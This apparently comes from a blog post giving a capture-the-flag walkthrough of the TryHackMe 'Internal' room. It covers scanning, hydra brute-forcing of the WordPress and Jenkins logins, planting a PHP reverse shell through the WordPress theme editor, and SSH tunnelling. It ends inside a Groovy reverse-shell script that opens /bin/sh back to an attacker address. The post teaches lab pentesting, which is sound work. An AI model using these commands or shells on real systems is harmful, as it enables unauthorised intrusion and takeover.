<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Internal Writeup TryHackMe" /><meta name="author" content="v3r4x" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://0xv3r4x.github.io/posts/internal-writeup-tryhackme/" /><meta property="og:url" content="https://0xv3r4x.github.io/posts/internal-writeup-tryhackme/" /><meta property="og:site_name" content="v3r4x" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-22T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Internal Writeup TryHackMe" /><meta name="twitter:site" content="@0xv3r4x" /><meta name="twitter:creator" content="@v3r4x" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"v3r4x"},"dateModified":"2022-06-26T22:54:29+01:00","datePublished":"2022-01-22T00:00:00+00:00","description":"Overview","headline":"Internal Writeup TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xv3r4x.github.io/posts/internal-writeup-tryhackme/"},"url":"https://0xv3r4x.github.io/posts/internal-writeup-tryhackme/"}</script><title>Internal Writeup | TryHackMe | v3r4x</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="v3r4x"><meta name="application-name" content="v3r4x"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/avatar-small.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">v3r4x</a></div><div class="site-subtitle font-italic">semper vigilat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0xV3R4X" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xv3r4x" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Internal Writeup | TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Internal Writeup | TryHackMe</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1642809600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 22, 2022 </em> </span> <span> Updated <em class="" data-ts="1656280469" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 26, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> v3r4x </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2013 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is my writeup for the Internal room on TryHackMe. Similar to the Relevant room, this room is not guided, so enumeration is key. In order to gain root, you must know how to exploit Wordpress and manually enumerate the system once you have gained access. You then have to exploit an internally hosted Jenkins server leading to a Docker container.</p><p>This is a hard room, so if you’re a beginner, I would highly recommend trying some other rooms like <a href="/posts/alfred-writeup-tryhackme/index.html">Alfred</a> and <a href="/posts/mr-robot-tryhackme-writeup/index.html">Mr. Robot</a> so that you become familiar with the technologies and techniques required to retrieve the flags.</p><h2 id="how-to-access"><span class="mr-2">How to Access</span><a href="#how-to-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I completed this challenge on TryHackme. You can access it <a href="https://tryhackme.com/room/relevant">here</a>.</p><h2 id="steps"><span class="mr-2">Steps</span><a href="#steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h4 id="rules-of-engagement"><span class="mr-2">Rules of Engagement</span><a href="#rules-of-engagement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The instructions for this room define the following rules of engagement:</p><ul><li>Ensure that you modify your hosts file to reflect <code class="language-plaintext highlighter-rouge">internal.thm</code><li>Any tools or techniques are permitted in this engagement<li>Locare and note all vulnerabilities found<li>Submit the flags discovered to the dashboard (<code class="language-plaintext highlighter-rouge">user.txt</code>, <code class="language-plaintext highlighter-rouge">root.txt</code>)<li>Only the IP address assigned to your machine is in scope</ul><p>With that all noted down, let’s begin!</p><h4 id="modifying-etchosts"><span class="mr-2">Modifying <code class="language-plaintext highlighter-rouge"><span class="mr-2">/etc/hosts</code></span><a href="#modifying-etchosts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>As the first RoE states, we have to include <code class="language-plaintext highlighter-rouge">interal.thm</code> in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. To do this, in a terminal, type:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ sudo nano /etc/hosts
</pre></table></code></div></div><p>Then, copy and paste the IP address of the target machine type <code class="language-plaintext highlighter-rouge">internal.thm</code>. Your file should look something like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>127.0.0.1       localhost
127.0.1.1       kali
&lt;ip_addr&gt;       internal.thm

# The following lines are desirable for IPv6 capable hosts
::1      localhost ip6-localhost ip6-loopback
ff01::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre></table></code></div></div><h4 id="scanning"><span class="mr-2">Scanning</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s begin with an <code class="language-plaintext highlighter-rouge">nmap</code> scan:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ nmap -sC -sV -oN scans/nmap_initial 10.10.167.33
# Nmap 7.91 scan initiated Thu May 27 16:57:47 2021 as: nmap -sC -sV -oN scans/nmap_initial 10.10.167.33
Nmap scan report for 10.10.167.33
Host is up (0.053s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 27 16:57:56 2021 -- 1 IP address (1 host up) scanned in 9.26 seconds
</pre></table></code></div></div><p>As the output shows, there are <strong>2</strong> open ports on the target machine:</p><ul><li>SSH on port 22 (Ubuntu v7.6p1)<li>HTTP on port 80 (Apache v2.4.29)</ul><h4 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s begin with the web server on port 80. If you navigate to the website, it will show the default Apache web page. Let’s run <code class="language-plaintext highlighter-rouge">gobuster</code> to see if there is anything else running:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>$ gobuster dir -u http://10.10.167.33/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.33/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/27 16:59:43 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--&gt; http://10.10.167.33/blog/]
/index.html           (Status: 200) [Size: 10918]                              
/javascript           (Status: 301) [Size: 317] [--&gt; http://10.10.167.33/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://10.10.167.33/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]                                      
/wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.167.33/wordpress/] 
                                                                                     
===============================================================
2021/05/27 17:00:08 Finished
===============================================================
</pre></table></code></div></div><p>So there is a <code class="language-plaintext highlighter-rouge">/blog</code> directory which looks like this:</p><p><img data-src="/assets/posts/20220122/1_blog.png" alt="blog" data-proofer-ignore></p><p>There is also two login pages. One to <code class="language-plaintext highlighter-rouge">phpmyadmin</code> and one to <code class="language-plaintext highlighter-rouge">wordpress</code>:</p><p><img data-src="/assets/posts/20220122/2_phpmyadmin.png" alt="phpmyadmin" data-proofer-ignore> <img data-src="/assets/posts/20220122/3_wordpress.png" alt="wordpress" data-proofer-ignore></p><p>Now that we know Wordpress is running in the background, we can run <code class="language-plaintext highlighter-rouge">wpscan</code> to enumerate this part of the site:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre>$ wpscan --url http://10.10.167.33/blog --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.167.33/blog/ [10.10.167.33]
[+] Started: Thu May 27 17:09:29 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.167.33/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.167.33/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.167.33/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.167.33/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.167.33/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 27 17:09:32 2021
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 11.942 KB
[+] Data Received: 302.953 KB
[+] Memory used: 128.887 MB
[+] Elapsed time: 00:00:02
</pre></table></code></div></div><p>From the output, we can see that the scan has identified an <code class="language-plaintext highlighter-rouge">admin</code> user as well as the version of Wordpress being used - 5.4.2. Trying some classic credential combinations confirms that <code class="language-plaintext highlighter-rouge">admin</code> is a valid user:</p><p><img data-src="/assets/posts/20220122/4_confirmation.png" alt="confirmation" data-proofer-ignore></p><p>Let’s boot up Burpsuite and see what’s being sent when the login form is submitted:</p><p><img data-src="/assets/posts/20220122/5_burpsuite.png" alt="burpsuite" data-proofer-ignore></p><p>We can now use this with <code class="language-plaintext highlighter-rouge">hydra</code> to brute force the password for the <code class="language-plaintext highlighter-rouge">admin</code> user.</p><h4 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using the following <code class="language-plaintext highlighter-rouge">hydra</code> command, you are able to get the password for the <code class="language-plaintext highlighter-rouge">admin</code> user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ hydra -l admin -P  /usr/share/wordlists/rockyou.txt 10.10.167.33 -V http-form-post '/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location'
</pre></table></code></div></div><p>Here, we are using the <code class="language-plaintext highlighter-rouge">-l</code> to specify the username (<code class="language-plaintext highlighter-rouge">admin</code>), <code class="language-plaintext highlighter-rouge">-P</code> to specify the wordlist (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), and <code class="language-plaintext highlighter-rouge">-V</code> to use verbose mode. We also use specify the type of the form using <code class="language-plaintext highlighter-rouge">http-form-post</code> and the paramters from Burpsuite.</p><p><img data-src="/assets/posts/20220122/6_hydra_admin_password.png" alt="admin password" data-proofer-ignore></p><p>Now, use these credentials to log in to the site.</p><p>Looking at the published pages, you will see that there is one private page:</p><p><img data-src="/assets/posts/20220122/7_private_page.png" alt="private page" data-proofer-ignore></p><p>This page holds credentials for <code class="language-plaintext highlighter-rouge">william</code>:</p><p><img data-src="/assets/posts/20220122/8_william_credentials.png" alt="william credentials" data-proofer-ignore></p><p>Unfortunately, this does not lead anywhere as there is no <code class="language-plaintext highlighter-rouge">william</code> user on the Wordpress site.</p><p>However, we can use the Wordpress Theme Editor to get a reverse shell. I am using the PHP reverse shell from pentest monkey (find it <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>).</p><p>Then, choose a page to edit (I’m using <code class="language-plaintext highlighter-rouge">404.php</code>), and paste in the reverse shell. Make sure to change the IP address and port so that you can catch the callback with <code class="language-plaintext highlighter-rouge">netcat</code>:</p><p><img data-src="/assets/posts/20220122/9_theme_editor.png" alt="theme editor" data-proofer-ignore></p><p>Then, configure <code class="language-plaintext highlighter-rouge">netcat</code> to listen on the port you chose. Then, navigate to <code class="language-plaintext highlighter-rouge">/blog/wp-content/themes/twentyseventeen/404.php</code> and your <code class="language-plaintext highlighter-rouge">netcat</code> listener should catch the callback:</p><p><img data-src="/assets/posts/20220122/10_netcat_callback.png" alt="netcat callback" data-proofer-ignore></p><p>A quick look around the system reveals that there is a <code class="language-plaintext highlighter-rouge">aubreanna</code> user in the <code class="language-plaintext highlighter-rouge">/home</code> directory:</p><p><img data-src="/assets/posts/20220122/11_home_dir.png" alt="home directory" data-proofer-ignore></p><p>But we cannot access it, so we need to do some more enumeration. However, this room has been set up in such a way to promote manual enumeration, so <code class="language-plaintext highlighter-rouge">linPEAS</code> will not work.</p><p>Looking through <code class="language-plaintext highlighter-rouge">/var/www/html</code>, you will find the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file containing credentials to the <code class="language-plaintext highlighter-rouge">phpmyadmin</code> page we found earlier:</p><p><img data-src="/assets/posts/20220122/12_wp_config.png" alt="wp-config" data-proofer-ignore> <img data-src="/assets/posts/20220122/13_phpmyadmin_creds.png" alt="phpmyadmin creds" data-proofer-ignore></p><p>Eventually, you’ll come across the <code class="language-plaintext highlighter-rouge">/opt</code> directory which contains the <code class="language-plaintext highlighter-rouge">wp-save.txt</code> file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:***************
</pre></table></code></div></div><p>We can now use these credentials to login as <code class="language-plaintext highlighter-rouge">aubreanna</code> via SSH:</p><p><img data-src="/assets/posts/20220122/14_ssh_login.png" alt="ssh login" data-proofer-ignore></p><p>Now, we can grab the <code class="language-plaintext highlighter-rouge">user.txt</code> flag within <code class="language-plaintext highlighter-rouge">/home/aubreanna</code>:</p><p><img data-src="/assets/posts/20220122/15_user_flag.png" alt="user.txt" data-proofer-ignore></p><p>All we have left to do now is escalate our privileges to grab the <code class="language-plaintext highlighter-rouge">root.txt</code> flag.</p><h4 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Within the <code class="language-plaintext highlighter-rouge">/home/aubreanna</code> directory, there is also a <code class="language-plaintext highlighter-rouge">jenkins.txt</code> file:</p><p><img data-src="/assets/posts/20220122/16_jenkins_txt.png" alt="jenkins.txt" data-proofer-ignore></p><p>Looks like there is an internal server running on <code class="language-plaintext highlighter-rouge">172.17.0.2:8080</code>. We can use SSH tunnelling to allow open this server up:</p><p><img data-src="/assets/posts/20220122/17_ssh_tunnel.png" alt="ssh tunnelling" data-proofer-ignore></p><p>Here we are creating a tunnel from port 4444 on our machine to port 8080 on the target machine. This means that we can navigate to <code class="language-plaintext highlighter-rouge">localhost:4444</code> and access this internal server:</p><p><img data-src="/assets/posts/20220122/18_jenkins.png" alt="jenkins" data-proofer-ignore></p><p>Similar to what we did earlier with Wordpress, we can view the Network tab of our browser’s developer tools to see what is being sent when the login form is submitted:</p><p><img data-src="/assets/posts/20220122/19_form_data.png" alt="form data" data-proofer-ignore></p><p>We can then use <code class="language-plaintext highlighter-rouge">hydra</code> again to bruteforce the password for the <code class="language-plaintext highlighter-rouge">admin</code> user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post '/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password'
</pre></table></code></div></div><p>Here we are using <code class="language-plaintext highlighter-rouge">-l</code> to specify the username (<code class="language-plaintext highlighter-rouge">admin</code>), <code class="language-plaintext highlighter-rouge">-P</code> to specify the wordlist (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), the IP and port to use (<code class="language-plaintext highlighter-rouge">127.0.0.1</code> (localhost) and <code class="language-plaintext highlighter-rouge">4444</code>), <code class="language-plaintext highlighter-rouge">-V</code> for verbose, and <code class="language-plaintext highlighter-rouge">-f</code> to tell <code class="language-plaintext highlighter-rouge">hydra</code> to exit once a valid combination is found. We also specify that this uses the <code class="language-plaintext highlighter-rouge">POST</code> method (<code class="language-plaintext highlighter-rouge">http-post-form</code>) and pass in the parameters we found from the network tab.</p><p>Eventually, we manage to get the credentials for the <code class="language-plaintext highlighter-rouge">admin</code> user:</p><p><img data-src="/assets/posts/20220122/20_admin_jenkins.png" alt="admin jenkins" data-proofer-ignore></p><p>Once we log in, we see that version <strong>2.250</strong> of Jenkins is being used. I found an article online (<a href="https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6">here</a>) which says you can use the “Script console” to execute groovy scripts on the system. We exploit this to gain a reverse shell back to our machine:</p><p><img data-src="/assets/posts/20220122/21_script_console.png" alt="script console" data-proofer-ignore> <img data-src="/assets/posts/20220122/22_script.png" alt="script" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>String host="&lt;ip_address&gt;";
int port=8888;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
